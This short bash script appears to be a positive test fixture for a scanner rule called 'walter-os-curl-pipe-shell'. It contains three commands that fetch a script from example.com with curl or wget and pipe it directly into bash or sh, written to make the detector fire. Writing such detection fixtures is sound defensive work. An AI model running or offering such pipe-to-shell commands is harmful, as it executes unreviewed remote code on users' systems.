#!/usr/bin/env bash
# POSITIVE fixture: should trip walter-os-curl-pipe-shell.
# shellcheck disable=all

curl -sSL https://example.com/install.sh | bash
curl https://example.com/setup | sh
wget -qO- https://example.com/install | bash
